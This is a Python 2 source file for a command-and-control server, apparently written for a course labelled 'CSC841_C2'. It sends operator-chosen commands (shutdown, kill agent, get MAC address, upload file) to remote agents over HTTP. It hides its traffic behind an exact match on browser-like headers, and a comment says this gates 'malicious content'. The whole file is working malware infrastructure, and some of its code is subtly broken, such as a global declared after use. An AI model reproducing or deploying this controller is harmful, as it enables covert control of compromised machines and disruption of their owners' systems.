#!/usr/bin/python
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import os
import cgi
import base64
from datetime import datetime

PORT_NUMBER = 80


#This class will handles any incoming request from
#the browser
class myHandler(BaseHTTPRequestHandler):

	#Handler for the GET requests
	def do_GET(self):
		if self.headers.get('User-Agent') == "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0" \
		and self.headers.get("Accept") == "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
		and self.headers.get("Accept-Encoding") == "gzip,deflate" \
		and self.headers.get("Accept-Language") == "en-US,en;q=0.9653":		#Check for appropriate headers before serving them malicious content
			now = datetime.now()
			print "[" + now.strftime("%d/%m/%Y %H:%M:%S") + "] " + "Agent Checked in From: " + self.client_address[0] + "\n"
			response_data = self.headers.get("Response")
			if response_data is not None:
				print "Agent Responded: " + str(response_data)
		else:
			return

#Handle normal command traffic
		mimetype = 'text/html'
		self.send_response(200)
		self.send_header('Content-type',mimetype)
		self.end_headers()
		self.wfile.write(cmd)
		global cmd  #Clear command
		cmd = ""
	def log_message(self, format, *args):
		return


try:
	#Create a web server and define the handler to manage the
	#incoming request
	server = HTTPServer(('', PORT_NUMBER), myHandler)
	os.system('clear')
	print 'C2 Server Running on Port ' , PORT_NUMBER
	print "==========================================================="
	print "			CSC841_C2"
	print "==========================================================="
	print "Commands:"
	print "shutdown -- Shuts down the host system immediately with no warning"
	print "killagent -- Kills the client process immediately"
	print "getmac -- Retrieves the MAC address of host computer"
	print "uploadfile -- Uploads local file to host system"
	while True:
		cmd = raw_input("Select your option: ")
		server.handle_request()
		server.handle_request()
except KeyboardInterrupt:
	print '^C received, shutting down the web server'
	server.socket.close()
